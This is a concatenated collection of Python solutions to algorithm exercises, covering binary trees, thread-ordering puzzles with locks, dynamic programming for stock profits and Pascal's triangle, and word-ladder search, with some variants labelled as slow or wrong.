if element.left:
next_level.append(element.left)
if element.right:
next_level.append(element.right)
return result
if __name__=="__main__":
Solution().levelOrderBottom(TreeNode(1))
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def sortedArrayToBST(self, num):
if not num:
return None
mid = (0+len(num))/2
left_subtree = self.sortedArrayToBST(num[0:mid])
right_subtree = self.sortedArrayToBST(num[mid+1:])
root = TreeNode(num[mid])
root.left = left_subtree
root.right = right_subtree
return root
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class ListNode:
def __init__(self, x):
self.val = x
self.next = None
class Solution:
def __init__(self):
self.current_node = None
def sortedListToBST(self, head):
if not head:
return head
self.current_node = head
length = self.getLength(head)
return self.sortedListToBST_dfs(0, length-1)
def sortedListToBST_dfs(self, start, end):
if start>end:
return
mid = (start+end)/2
left_subtree = self.sortedListToBST_dfs(start, mid-1)
root = TreeNode(self.current_node.val)
self.current_node = self.current_node.next
right_subtree = self.sortedListToBST_dfs(mid+1, end)
root.left = left_subtree
root.right = right_subtree
return root
def getLength(self, head):
count = 0
while head:
head = head.next
count += 1
return count
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def __init__(self):
self.depth_bottom = {}
def isBalanced(self, root):
self.fathom(root, 0)
return self._is_balanced(root, 0)
def _is_balanced(self, cur, depth):
if not cur:
return True
h1 = h2 = depth
if cur.left: h1 = self.depth_bottom[cur.left]
if cur.right: h2 = self.depth_bottom[cur.right]
if abs(h1 - h2) > 1:
return False
return all([self._is_balanced(cur.left, depth+1), self._is_balanced(cur.right, depth+1)])
def fathom(self, root, depth):
if not root:
return depth-1
ret = max(self.fathom(root.left, depth+1), self.fathom(root.right, depth+1))
self.depth_bottom[root] = ret
return ret
class SolutionSlow(object):
def isBalanced(self, root):
if not root:
return True
if abs(self.fathom(root.left, 0)-self.fathom(root.right, 0)) > 1:
return False
if self.isBalanced(root.left) and self.isBalanced(root.right):
return True
else:
return False
def fathom(self, root, depth):
if not root:
return depth-1
return max(self.fathom(root.left, depth+1), self.fathom(root.right, depth+1))
class TreeNode(object):
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution(object):
def minDepth(self, root):
return self.fathom(root, 0)
def fathom(self, root, depth):
if not root: return depth
elif root.right and not root.left: return self.fathom(root.right, depth+1)
elif root.left and not root.right: return self.fathom(root.left, depth+1)
else: return min(self.fathom(root.left, depth+1),
self.fathom(root.right, depth+1))
from typing import Callable
from threading import Lock
class Foo:
def __init__(self):
self.locks = [Lock(), Lock()]
self.locks[0].acquire()
self.locks[1].acquire()
def first(self, printFirst: Callable[[], None]) -> None:
printFirst()
self.locks[0].release()
def second(self, printSecond: Callable[[], None]) -> None:
with self.locks[0]:
printSecond()
self.locks[1].release()
def third(self, printThird: Callable[[], None]) -> None:
with self.locks[1]:
printThird()
class FooError:
def __init__(self):
self._value = 1
self._lock = Lock()
def first(self, printFirst: 'Callable[[], None]') -> None:
with self._lock:
if self._value == 1:
self._value += 1
printFirst()
def second(self, printSecond: 'Callable[[], None]') -> None:
with self._lock:
if self._value == 2:
self._value += 1
printSecond()
def third(self, printThird: 'Callable[[], None]') -> None:
with self._lock:
if self._value == 3:
self._value += 1
printThird()
from threading import Lock
from typing import Callable
class FooBar:
def __init__(self, n):
self.n = n
self.locks = [Lock(), Lock()]
self.locks[1].acquire()
def foo(self, printFoo: Callable[[], None]) -> None:
for i in range(self.n):
self.locks[0].acquire()
printFoo()
self.locks[1].release()
def bar(self, printBar: Callable[[], None]) -> None:
for i in range(self.n):
self.locks[1].acquire()
printBar()
self.locks[0].release()
from typing import Callable
from threading import Lock
class ZeroEvenOdd:
def __init__(self, n):
self.n = n
self.locks = [Lock() for _ in range(3)]
self.locks[1].acquire()
self.locks[2].acquire()
def zero(self, printNumber: Callable[[int], None]) -> None:
for i in range(self.n):
self.locks[0].acquire()
printNumber(0)
if (i + 1) % 2 == 1:
self.locks[1].release()
else:
self.locks[2].release()
def odd(self, printNumber: Callable[[int], None]) -> None:
for i in range((self.n + 1) // 2):
self.locks[1].acquire()
printNumber(i * 2 + 1)
self.locks[0].release()
def even(self, printNumber: Callable[[int], None]) -> None:
for i in range(self.n // 2):
self.locks[2].acquire()
printNumber(i * 2 + 2)
self.locks[0].release()
class ZeroEvenOddError:
def __init__(self, n):
self.n = n
self.locks = [Lock(), Lock(), Lock(), Lock()]
for i in range(1, len(self.locks)):
self.locks[i].acquire()
def zero(self, printNumber: 'Callable[[int], None]') -> None:
with self.locks[0]:
printNumber(0)
def even(self, printNumber: 'Callable[[int], None]') -> None:
pass
def odd(self, printNumber: 'Callable[[int], None]') -> None:
pass
from typing import Callable
from threading import Semaphore
from collections import deque
class H2O:
def __init__(self):
self.hq = deque()
self.oq = deque()
def hydrogen(self, releaseHydrogen: Callable[[], None]) -> None:
self.hq.append(releaseHydrogen)
self.try_output()
def oxygen(self, releaseOxygen: Callable[[], None]) -> None:
self.oq.append(releaseOxygen)
self.try_output()
def try_output(self):
if len(self.hq) >= 2 and len(self.oq) >= 1:
self.hq.popleft()()
self.hq.popleft()()
self.oq.popleft()()
class H2O_TLE2:
def __init__(self):
self.gates = [Semaphore(2), Semaphore(0)]
def hydrogen(self, releaseHydrogen: Callable[[], None]) -> None:
self.gates[0].acquire()
releaseHydrogen()
if self.gates[0].acquire(blocking=False):
self.gates[0].release()
else:
self.gates[1].release()
def oxygen(self, releaseOxygen: Callable[[], None]) -> None:
self.gates[1].acquire()
releaseOxygen()
self.gates[0].release()
self.gates[0].release()
class H2O_TLE:
def __init__(self):
self.h_cnt = 0
self.locks = [Lock() for _ in range(3)]
self.locks[1].acquire()
def hydrogen(self, releaseHydrogen: Callable[[], None]) -> None:
self.locks[0].acquire()
self.h_cnt += 1
releaseHydrogen()
if self.h_cnt < 2:
self.locks[0].release()
else:
self.locks[1].release()
def oxygen(self, releaseOxygen: Callable[[], None]) -> None:
self.locks[1].acquire()
releaseOxygen()
self.h_cnt = 0
self.locks[0].release()
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def hasPathSum(self, root, sum):
if not root:
return False
sum = sum-root.val
if sum==0 and root.left is None and root.right is None:
return True
return self.hasPathSum(root.left, sum) or self.hasPathSum(root.right, sum)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
def pathSum(self, root, sum):
result = []
self.accumulatePathSum(root, sum, [], result)
return result
def accumulatePathSum(self, root, sum, cur_path, result):
if not root:
return
sum = sum - root.val
cur_path.append(root.val)
if sum==0 and root.left is None and root.right is None:
result.append(list(cur_path))
return
if root.left: self.accumulatePathSum(root.left, sum, list(cur_path), result)
if root.right: self.accumulatePathSum(root.right, sum, list(cur_path), result)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
def __repr__(self):
return repr(self.val)
class Solution:
def flatten_data_structure(self, root):
if not root:
return
lst = []
self.dfs_traverse(root, lst)
lst = lst[1:]
root.left = None
cur = root
for node in lst:
node.left = None
node.right = None
cur.right = node
cur = cur.right
def dfs_traverse(self, root, lst):
if not root:
return
lst.append(root)
self.dfs_traverse(root.left, lst)
self.dfs_traverse(root.right, lst)
def flatten(self, root):
if not root:
return None
left_last = self.get_last(root.left)
left = self.flatten(root.left)
right = self.flatten(root.right)
root.left = None
if left:
root.right = left
left_last.right = right
else:
root.right = right
return root
def get_last(self, root):
if not root:
return None
if not root.left and not root.right:
return root
if root.right:
return self.get_last(root.right)
else:
return self.get_last(root.left)
if __name__=="__main__":
node1 = TreeNode(1)
node2 = TreeNode(2)
node1.left = node2
Solution().flatten(node1)
class Solution:
def numDistinct(self, S, T):
len_s = len(S)
len_t = len(T)
dp = [[-1 for _ in xrange(len_s+1)] for _ in xrange(len_t+1)]
for col in xrange(len_s+1):
dp[0][col] = 1
for row in xrange(1, len_t+1):
dp[row][0] = 0
for row in xrange(1, len_t+1):
for col in xrange(1, len_s+1):
if S[col-1]==T[row-1]:
dp[row][col] = dp[row][col-1]+dp[row-1][col-1]
else:
dp[row][col] = dp[row][col-1]
return dp[-1][-1]
if __name__=="__main__":
assert Solution().numDistinct("rabbbit", "rabbit")==3
class Solution:
def generate(self, numRows):
result = []
for row in xrange(numRows):
current = []
for col in xrange(row+1):
if col==0 or col==row:
current.append(1)
else:
current.append(result[row-1][col-1]+result[row-1][col])
result.append(current)
return result
if __name__=="__main__":
print Solution().generate(5)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
self.next = None
class Solution:
def connect(self, root):
if not root:
return None
q = [root]
while q:
current_level = q
q = []
for ind, val in enumerate(current_level):
if val.left: q.append(val.left)
if val.right: q.append(val.right)
try:
val.next = current_level[ind+1]
except IndexError:
val.next = None
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
self.next = None
class Solution:
def connect(self, root):
if not root:
return None
q = [root]
while q:
current_level = q
q = []
for ind, val in enumerate(current_level):
if val.left: q.append(val.left)
if val.right: q.append(val.right)
try:
val.next = current_level[ind+1]
except IndexError:
val.next = None
class Solution:
def getRow(self, rowIndex):
if rowIndex<0:
return None
if rowIndex==0:
return [1]
current_level = [1, 1]
for row in xrange(2, rowIndex+1):
temp = current_level[0]
for col in xrange(1, row):
summation = current_level[col] + temp
temp = current_level[col]
current_level[col] = summation
current_level.append(1)
return current_level
if __name__=="__main__":
print Solution().getRow(3)
class Solution:
def minimumTotal(self, triangle):
dp = []
length = len(triangle)
dp.insert(0, [num for num in triangle[length-1]])
for row in xrange(length-1-1, -1, -1):
dp.insert(0, [])
for col in xrange(len(triangle[row])):
dp[0].append(triangle[row][col]+min(dp[1][col], dp[1][col+1]))
assert len(dp[0])==1
return dp[0][0]
if __name__=="__main__":
Solution().minimumTotal([[-1], [2, 3], [1, -1, -3]])
class Solution:
def maxProfit(self, prices):
if len(prices) <= 1:
return 0
delta_prices = []
for i in xrange(1, len(prices)):
delta_prices.append(prices[i]-prices[i-1])
profit = 0
for i in xrange(len(delta_prices)):
if delta_prices[i] > 0:
profit += delta_prices[i]
return profit
class Solution(object):
def maxProfit(self, A):
if len(A) <= 1:
return 0
n = len(A)
F = [0 for _ in xrange(n+1)]
maxa = 0
for i in xrange(2, n+1):
F[i] = max(F[i-1] + A[i-1] - A[i-2], 0)
maxa = max(maxa, F[i])
return maxa
def maxProfitDelta(self, prices):
if len(prices) <= 1:
return 0
delta_prices = []
for i in xrange(1, len(prices)):
delta_prices.append(prices[i]-prices[i-1])
max_sub_array = 0
current_sub_array = 0
for j in xrange(len(delta_prices)):
current_sub_array = max(0, current_sub_array+delta_prices[j])
max_sub_array = max(max_sub_array, current_sub_array)
return max_sub_array
if __name__ == "__main__":
assert Solution().maxProfit([3, 2, 1, 4, 5, 6, 2]) == 5
class Solution:
def maxProfit(self, prices):
if len(prices) <= 1:
return 0
forward = [0 for _ in xrange(len(prices))]
lowest_buy_price = prices[0]
for i in xrange(1, len(prices)):
forward[i] = max(forward[i-1], prices[i]-lowest_buy_price)
lowest_buy_price = min(prices[i], lowest_buy_price)
backward = [0 for _ in xrange(len(prices))]
highest_sell_price = prices[-1]
for i in xrange(len(prices)-2, -1, -1):
backward[i] = max(backward[i+1], highest_sell_price-prices[i])
highest_sell_price = max(prices[i], highest_sell_price)
max_profit = 0
for i in xrange(len(prices)):
max_profit = max(max_profit, forward[i]+backward[i])
return max_profit
def maxProfit_error(self, prices):
if len(prices) <= 1:
return 0
delta_prices = []
for i in xrange(1, len(prices)):
delta_prices.append(prices[i]-prices[i-1])
max_profits = [0, 0]
max_sub_array = 0
current_sub_array = 0
for j in xrange(len(delta_prices)):
if current_sub_array+delta_prices[j] >= 0:
current_sub_array += delta_prices[j]
max_sub_array = max(max_sub_array, current_sub_array)
else:
if max_sub_array > max_profits[0]:
max_profits[1] = max_profits[0]
max_profits[0] = max_sub_array
elif max_sub_array > max_profits[1]:
max_profits[1] = max_sub_array
max_sub_array = 0
current_sub_array = 0
return sum(max_profits)
class TreeNode:
def __init__(self, x):
self.val = x
self.left = None
self.right = None
class Solution:
global_max = -1<<31
def maxPathSum(self, root):
self.get_max_component(root)
return self.global_max
def get_max_component(self, root):
if not root:
return 0
left_max_component = self.get_max_component(root.left)
right_max_component = self.get_max_component(root.right)
current_max_sum = max(root.val, root.val+left_max_component, root.val+right_max_component, root.val+left_max_component+right_max_component)
self.global_max = max(self.global_max, current_max_sum)
return max(root.val, root.val+left_max_component, root.val+right_max_component)
class Solution(object):
def isPalindrome(self, s):
s = s.lower()
s = ''.join(e for e in s if e.isalnum())
if not s:
return True
return s == s[::-1]
class Solution_MLE:
class Node:
def __init__(self, string, pre, dict):
self.string = string
self.pre = pre
self.dict = dict
def __repr__(self):
return repr(self.string)
def findLadders(self, start, end, dict):
result = []
lower_cases = [chr(i+ord('a')) for i in xrange(26)]
start_node = self.Node(start, None, dict-{start}|{end})
queue = [start_node]
while queue:
length_0 = len(queue)
for i in xrange(length_0):
current = queue[i]
if current.string==end:
self.append(current, result)
if result:
return result
for i in xrange(length_0):
current = queue[i].string
for pos in xrange(len(current)):
lst = list(current)
for char in lower_cases:
lst[pos] = char
temp = "".join(lst)
if temp in queue[i].dict:
queue.append(self.Node(temp, queue[i], queue[i].dict-{temp}))
queue = queue[length_0:]
return []
def append(self, node, result):
cur = node
lst = []
while cur:
lst.insert(0, cur.string)
cur = cur.pre
result.append(lst)
class Solution_TLE:
class Node:
def __init__(self, string, pre):
self.string = string
self.pre = pre
def __repr__(self):
return repr(self.string)
def findLadders(self, start, end, dict):
dict |= {end}
result = []
lower_cases = [chr(i+ord('a')) for i in xrange(26)]
start_node = self.Node(start, None)
queue = [start_node]
while queue:
length_0 = len(queue)
for i in xrange(length_0):
current = queue[i]
if current.string==end:
self.append(current, result)
if result:
return result
for i in xrange(length_0):
current = queue[i].string
for pos in xrange(len(current)):
lst = list(current)
for char in lower_cases:
lst[pos] = char
temp = "".join(lst)
if temp in dict and not self.in_previous(queue[i], temp):
queue.append(self.Node(temp, queue[i]))
queue = queue[length_0:]
return []
def append(self, node, result):
cur = node
lst = []
while cur:
lst.insert(0, cur.string)
cur = cur.pre
result.append(lst)
def in_previous(self, node, string):
cur = node
while cur:
if cur.string==string:
return True
cur = cur.pre
return False
class Node:
def __init__(self, string, pre):
self.string = string
self.pre = pre
def __repr__(self):
return repr(self.string)
class Solution_TLE2:
def findLadders(self, start, end, dict):
dict |= {end}
result = []
lower_cases = 'abcdefghijklmnopqrstuvwxyz'
queue = [Node(start, None)]
while queue:
length_0 = len(queue)
for i in xrange(length_0):
current = queue[i]
dict -= {current.string}
if current.string==end:
self.append(current, result)
if result:
return result
for i in xrange(length_0):
current = queue[i].string
for pos in xrange(len(current)):
lst = list(current)
for char in lower_cases:
lst[pos] = char
temp = "".join(lst)
if temp in dict:
queue.append(Node(temp, queue[i]))
queue = queue[length_0:]
return []
def append(self, node, result):
cur = node
lst = []
while cur:
lst.insert(0, cur.string)
cur = cur.pre
result.append(lst)
class Solution:
def findLadders(self, start, end, dict):
dict |= {start}
dict |= {end}
result=[]
prevMap={}
for i in dict:
prevMap[i]=[]
candidates=[set(), set()]
current=0
previous=1
candidates[current].add(start)
while end not in candidates[current]:
current, previous = previous, current
for i in candidates[previous]: dict -= {i}
candidates[current].clear()
for word in candidates[previous]:
for i in range(len(word)):
part1=word[:i]; part2=word[i+1:]
for j in 'abcdefghijklmnopqrstuvwxyz':
if word[i]!=j:
nextword=part1+j+part2
if nextword in dict:
prevMap[nextword].append(word)
candidates[current] |= {nextword}
if len(candidates[current])==0: return []
self.buildpath(prevMap, end, [], result)
return result
def buildpath(self, prevMap, word, path, result):
if len(prevMap[word])==0:
path.append(word)
result.append(path[::-1])
path.pop()
return
path.append(word)
for predecessor in prevMap[word]:
self.buildpath(prevMap, predecessor, path, result)
path.pop()
if __name__=="__main__":
print Solution().findLadders("hot", "dog", set(["hot","dog"]))
print Solution().findLadders("hit", "cog", set(["hot","dot","dog","lot","log"]))
print Solution().findLadders("cet", "ism", set(["kid","tag","pup","ail","tun","woo","erg","luz","brr","gay","sip","kay","per","val","mes","ohs","now","boa","cet","pal","bar","die","war","hay","eco","pub","lob","rue","fry","lit","rex","jan","cot","bid","ali","pay","col","gum","ger","row","won","dan","rum","fad","tut","sag","yip","sui","ark","has","zip","fez","own","ump","dis","ads","max","jaw","out","btu","ana","gap","cry","led","abe","box","ore","pig","fie","toy","fat","cal","lie","noh","sew","ono","tam","flu","mgm","ply","awe","pry","tit","tie","yet","too","tax","jim","san","pan","map","ski","ova","wed","non","wac","nut","why","bye","lye","oct","old","fin","feb","chi","sap","owl","log","tod","dot","bow","fob","for","joe","ivy","fan","age","fax","hip","jib","mel","hus","sob","ifs","tab","ara","dab","jag","jar","arm","lot","tom","sax","tex","yum","pei","wen","wry","ire","irk","far","mew","wit","doe","gas","rte","ian","pot","ask","wag","hag","amy","nag","ron","soy","gin","don","tug","fay","vic","boo","nam","ave","buy","sop","but","orb","fen","paw","his","sub","bob","yea","oft","inn","rod","yam","pew","web","hod","hun","gyp","wei","wis","rob","gad","pie","mon","dog","bib","rub","ere","dig","era","cat","fox","bee","mod","day","apr","vie","nev","jam","pam","new","aye","ani","and","ibm","yap","can","pyx","tar","kin","fog","hum","pip","cup","dye","lyx","jog","nun","par","wan","fey","bus","oak","bad","ats","set","qom","vat","eat","pus","rev","axe","ion","six","ila","lao","mom","mas","pro","few","opt","poe","art","ash","oar","cap","lop","may","shy","rid","bat","sum","rim","fee","bmw","sky","maj","hue","thy","ava","rap","den","fla","auk","cox","ibo","hey","saw","vim","sec","ltd","you","its","tat","dew","eva","tog","ram","let","see","zit","maw","nix","ate","gig","rep","owe","ind","hog","eve","sam","zoo","any","dow","cod","bed","vet","ham","sis","hex","via","fir","nod","mao","aug","mum","hoe","bah","hal","keg","hew","zed","tow","gog","ass","dem","who","bet","gos","son","ear","spy","kit","boy","due","sen","oaf","mix","hep","fur","ada","bin","nil","mia","ewe","hit","fix","sad","rib","eye","hop","haw","wax","mid","tad","ken","wad","rye","pap","bog","gut","ito","woe","our","ado","sin","mad","ray","hon","roy","dip","hen","iva","lug","asp","hui","yak","bay","poi","yep","bun","try","lad","elm","nat","wyo","gym","dug","toe","dee","wig","sly","rip","geo","cog","pas","zen","odd","nan","lay","pod","fit","hem","joy","bum","rio","yon","dec","leg","put","sue","dim","pet","yaw","nub","bit","bur","sid","sun","oil","red","doc","moe","caw","eel","dix","cub","end","gem","off","yew","hug","pop","tub","sgt","lid","pun","ton","sol","din","yup","jab","pea","bug","gag","mil","jig","hub","low","did","tin","get","gte","sox","lei","mig","fig","lon","use","ban","flo","nov","jut","bag","mir","sty","lap","two","ins","con","ant","net","tux","ode","stu","mug","cad","nap","gun","fop","tot","sow","sal","sic","ted","wot","del","imp","cob","way","ann","tan","mci","job","wet","ism","err","him","all","pad","hah","hie","aim","ike","jed","ego","mac","baa","min","com","ill","was","cab","ago","ina","big","ilk","gal","tap","duh","ola","ran","lab","top","gob","hot","ora","tia","kip","han","met","hut","she","sac","fed","goo","tee","ell","not","act","gil","rut","ala","ape","rig","cid","god","duo","lin","aid","gel","awl","lag","elf","liz","ref","aha","fib","oho","tho","her","nor","ace","adz","fun","ned","coo","win","tao","coy","van","man","pit","guy","foe","hid","mai","sup","jay","hob","mow","jot","are","pol","arc","lax","aft","alb","len","air","pug","pox","vow","got","meg","zoe","amp","ale","bud","gee","pin","dun","pat","ten","mob"]))
print Solution().findLadders("nanny", "aloud", set(["ricky","grind","cubic","panic","lover","farce","gofer","sales","flint","omens","lipid","briny","cloth","anted","slime","oaten","harsh","touts","stoop","cabal","lazed","elton","skunk","nicer","pesky","kusch","bused","kinda","tunis","enjoy","aches","prowl","babar","rooms","burst","slush","pines","urine","pinky","bayed","mania","light","flare","wares","women","verne","moron","shine","bluer","zeros","bleak","brief","tamra","vasts","jamie","lairs","penal","worst","yowls","pills","taros","addle","alyce","creep","saber","floyd","cures","soggy","vexed","vilma","cabby","verde","euler","cling","wanna","jenny","donor","stole","sakha","blake","sanes","riffs","forge","horus","sered","piked","prosy","wases","glove","onset","spake","benin","talks","sites","biers","wendy","dante","allan","haven","nears","shaka","sloth","perky","spear","spend","clint","dears","sadly","units","vista","hinds","marat","natal","least","bough","pales","boole","ditch","greys","slunk","bitch","belts","sense","skits","monty","yawns","music","hails","alien","gibes","lille","spacy","argot","wasps","drubs","poops","bella","clone","beast","emend","iring","start","darla","bells","cults","dhaka","sniff","seers","bantu","pages","fever","tacky","hoses","strop","climb","pairs","later","grant","raven","stael","drips","lucid","awing","dines","balms","della","galen","toned","snips","shady","chili","fears","nurse","joint","plump","micky","lions","jamal","queer","ruins","frats","spoof","semen","pulps","oldie","coors","rhone","papal","seals","spans","scaly","sieve","klaus","drums","tided","needs","rider","lures","treks","hares","liner","hokey","boots","primp","laval","limes","putts","fonda","damon","pikes","hobbs","specs","greet","ketch","braid","purer","tsars","berne","tarts","clean","grate","trips","chefs","timex","vicky","pares","price","every","beret","vices","jodie","fanny","mails","built","bossy","farms","pubic","gongs","magma","quads","shell","jocks","woods","waded","parka","jells","worse","diner","risks","bliss","bryan","terse","crier","incur","murky","gamed","edges","keens","bread","raced","vetch","glint","zions","porno","sizes","mends","ached","allie","bands","plank","forth","fuels","rhyme","wimpy","peels","foggy","wings","frill","edgar","slave","lotus","point","hints","germs","clung","limed","loafs","realm","myron","loopy","plush","volts","bimbo","smash","windy","sours","choke","karin","boast","whirr","tiber","dimes","basel","cutes","pinto","troll","thumb","decor","craft","tared","split","josue","tramp","screw","label","lenny","apses","slept","sikhs","child","bouts","cites","swipe","lurks","seeds","fists","hoard","steed","reams","spoil","diego","peale","bevel","flags","mazes","quart","snipe","latch","lards","acted","falls","busby","holed","mummy","wrong","wipes","carlo","leers","wails","night","pasty","eater","flunk","vedas","curse","tyros","mirth","jacky","butte","wired","fixes","tares","vague","roved","stove","swoon","scour","coked","marge","cants","comic","corns","zilch","typos","lives","truer","comma","gaily","teals","witty","hyper","croat","sways","tills","hones","dowel","llano","clefs","fores","cinch","brock","vichy","bleed","nuder","hoyle","slams","macro","arabs","tauts","eager","croak","scoop","crime","lurch","weals","fates","clipt","teens","bulls","domed","ghana","culls","frame","hanky","jared","swain","truss","drank","lobby","lumps","pansy","whews","saris","trite","weeps","dozes","jeans","flood","chimu","foxes","gelds","sects","scoff","poses","mares","famed","peers","hells","laked","zests","wring","steal","snoot","yodel","scamp","ellis","bandy","marry","jives","vises","blurb","relay","patch","haley","cubit","heine","place","touch","grain","gerry","badly","hooke","fuchs","savor","apron","judge","loren","britt","smith","tammy","altar","duels","huber","baton","dived","apace","sedan","basts","clark","mired","perch","hulks","jolly","welts","quack","spore","alums","shave","singe","lanny","dread","profs","skeet","flout","darin","newed","steer","taine","salvo","mites","rules","crash","thorn","olive","saves","yawed","pique","salon","ovens","dusty","janie","elise","carve","winds","abash","cheep","strap","fared","discs","poxed","hoots","catch","combo","maize","repay","mario","snuff","delve","cored","bards","sudan","shuns","yukon","jowls","wayne","torus","gales","creek","prove","needy","wisps","terri","ranks","books","dicky","tapes","aping","padre","roads","nines","seats","flats","rains","moira","basic","loves","pulls","tough","gills","codes","chest","teeny","jolts","woody","flame","asked","dulls","hotly","glare","mucky","spite","flake","vines","lindy","butts","froth","beeps","sills","bunny","flied","shaun","mawed","velds","voled","doily","patel","snake","thigh","adler","calks","desks","janus","spunk","baled","match","strip","hosed","nippy","wrest","whams","calfs","sleet","wives","boars","chain","table","duked","riped","edens","galas","huffs","biddy","claps","aleut","yucks","bangs","quids","glenn","evert","drunk","lusts","senna","slate","manet","roted","sleep","loxes","fluky","fence","clamp","doted","broad","sager","spark","belch","mandy","deana","beyer","hoist","leafy","levee","libel","tonic","aloes","steam","skews","tides","stall","rifts","saxon","mavis","asama","might","dotes","tangs","wroth","kited","salad","liens","clink","glows","balky","taffy","sided","sworn","oasis","tenth","blurt","tower","often","walsh","sonny","andes","slump","scans","boded","chive","finer","ponce","prune","sloes","dined","chums","dingo","harte","ahead","event","freer","heart","fetch","sated","soapy","skins","royal","cuter","loire","minot","aisle","horny","slued","panel","eight","snoop","pries","clive","pored","wrist","piped","daren","cells","parks","slugs","cubed","highs","booze","weary","stain","hoped","finny","weeds","fetid","racer","tasks","right","saint","shahs","basis","refer","chart","seize","lulls","slant","belay","clots","jinny","tours","modes","gloat","dunks","flute","conch","marts","aglow","gayer","lazes","dicks","chime","bears","sharp","hatch","forms","terry","gouda","thins","janet","tonya","axons","sewed","danny","rowdy","dolts","hurry","opine","fifty","noisy","spiky","humid","verna","poles","jayne","pecos","hooky","haney","shams","snots","sally","ruder","tempe","plunk","shaft","scows","essie","dated","fleet","spate","bunin","hikes","sodas","filly","thyme","fiefs","perks","chary","kiths","lidia","lefty","wolff","withe","three","crawl","wotan","brown","japed","tolls","taken","threw","crave","clash","layer","tends","notes","fudge","musky","bawdy","aline","matts","shirr","balks","stash","wicks","crepe","foods","fares","rotes","party","petty","press","dolly","mangy","leeks","silly","leant","nooks","chapt","loose","caged","wages","grist","alert","sheri","moody","tamps","hefts","souls","rubes","rolex","skulk","veeps","nonce","state","level","whirl","bight","grits","reset","faked","spiny","mixes","hunks","major","missy","arius","damns","fitly","caped","mucus","trace","surat","lloyd","furry","colin","texts","livia","reply","twill","ships","peons","shear","norms","jumbo","bring","masks","zippy","brine","dorks","roded","sinks","river","wolfs","strew","myths","pulpy","prank","veins","flues","minus","phone","banns","spell","burro","brags","boyle","lambs","sides","knees","clews","aired","skirt","heavy","dimer","bombs","scums","hayes","chaps","snugs","dusky","loxed","ellen","while","swank","track","minim","wiled","hazed","roofs","cantu","sorry","roach","loser","brass","stint","jerks","dirks","emory","campy","poise","sexed","gamer","catty","comte","bilbo","fasts","ledge","drier","idles","doors","waged","rizal","pured","weirs","crisp","tasty","sored","palmy","parts","ethel","unify","crows","crest","udder","delis","punks","dowse","totes","emile","coded","shops","poppa","pours","gushy","tiffs","shads","birds","coils","areas","boons","hulls","alter","lobes","pleat","depth","fires","pones","serra","sweat","kline","malay","ruled","calve","tired","drabs","tubed","wryer","slung","union","sonya","aided","hewed","dicey","grids","nixed","whits","mills","buffs","yucky","drops","ready","yuppy","tweet","napes","cadre","teach","rasps","dowdy","hoary","canto","posed","dumbo","kooks","reese","snaky","binge","byron","phony","safer","friar","novel","scale","huron","adorn","carla","fauna","myers","hobby","purse","flesh","smock","along","boils","pails","times","panza","lodge","clubs","colby","great","thing","peaks","diana","vance","whets","bergs","sling","spade","soaks","beach","traps","aspen","romps","boxed","fakir","weave","nerds","swazi","dotty","curls","diver","jonas","waite","verbs","yeast","lapel","barth","soars","hooks","taxed","slews","gouge","slags","chang","chafe","saved","josie","syncs","fonds","anion","actor","seems","pyrex","isiah","glued","groin","goren","waxes","tonia","whine","scads","knelt","teaks","satan","tromp","spats","merry","wordy","stake","gland","canal","donna","lends","filed","sacks","shied","moors","paths","older","pooch","balsa","riced","facet","decaf","attic","elder","akron","chomp","chump","picky","money","sheer","bolls","crabs","dorms","water","veers","tease","dummy","dumbs","lethe","halls","rifer","demon","fucks","whips","plops","fuses","focal","taces","snout","edict","flush","burps","dawes","lorry","spews","sprat","click","deann","sited","aunts","quips","godly","pupil","nanny","funks","shoon","aimed","stacy","helms","mints","banks","pinch","local","twine","pacts","deers","halos","slink","preys","potty","ruffs","pusan","suits","finks","slash","prods","dense","edsel","heeds","palls","slats","snits","mower","rares","ailed","rouge","ellie","gated","lyons","duded","links","oaths","letha","kicks","firms","gravy","month","kongo","mused","ducal","toted","vocal","disks","spied","studs","macao","erick","coupe","starr","reaps","decoy","rayon","nicks","breed","cosby","haunt","typed","plain","trays","muled","saith","drano","cower","snows","buses","jewry","argus","doers","flays","swish","resin","boobs","sicks","spies","bails","wowed","mabel","check","vapid","bacon","wilda","ollie","loony","irked","fraud","doles","facts","lists","gazed","furls","sunks","stows","wilde","brick","bowed","guise","suing","gates","niter","heros","hyped","clomp","never","lolls","rangy","paddy","chant","casts","terns","tunas","poker","scary","maims","saran","devon","tripe","lingo","paler","coped","bride","voted","dodge","gross","curds","sames","those","tithe","steep","flaks","close","swops","stare","notch","prays","roles","crush","feuds","nudge","baned","brake","plans","weepy","dazed","jenna","weiss","tomes","stews","whist","gibed","death","clank","cover","peeks","quick","abler","daddy","calls","scald","lilia","flask","cheer","grabs","megan","canes","jules","blots","mossy","begun","freak","caved","hello","hades","theed","wards","darcy","malta","peter","whorl","break","downs","odder","hoofs","kiddo","macho","fords","liked","flees","swing","elect","hoods","pluck","brook","astir","bland","sward","modal","flown","ahmad","waled","craps","cools","roods","hided","plath","kings","grips","gives","gnats","tabby","gauls","think","bully","fogey","sawed","lints","pushy","banes","drake","trail","moral","daley","balds","chugs","geeky","darts","soddy","haves","opens","rends","buggy","moles","freud","gored","shock","angus","puree","raves","johns","armed","packs","minis","reich","slots","totem","clown","popes","brute","hedge","latin","stoke","blend","pease","rubik","greer","hindi","betsy","flows","funky","kelli","humps","chewy","welds","scowl","yells","cough","sasha","sheaf","jokes","coast","words","irate","hales","camry","spits","burma","rhine","bends","spill","stubs","power","voles","learn","knoll","style","twila","drove","dacca","sheen","papas","shale","jones","duped","tunny","mouse","floss","corks","skims","swaps","inned","boxer","synch","skies","strep","bucks","belau","lower","flaky","quill","aural","rufus","floes","pokes","sends","sates","dally","boyer","hurts","foyer","gowns","torch","luria","fangs","moats","heinz","bolts","filet","firth","begot","argue","youth","chimp","frogs","kraft","smite","loges","loons","spine","domes","pokey","timur","noddy","doggy","wades","lanes","hence","louts","turks","lurid","goths","moist","bated","giles","stood","winos","shins","potts","brant","vised","alice","rosie","dents","babes","softy","decay","meats","tanya","rusks","pasts","k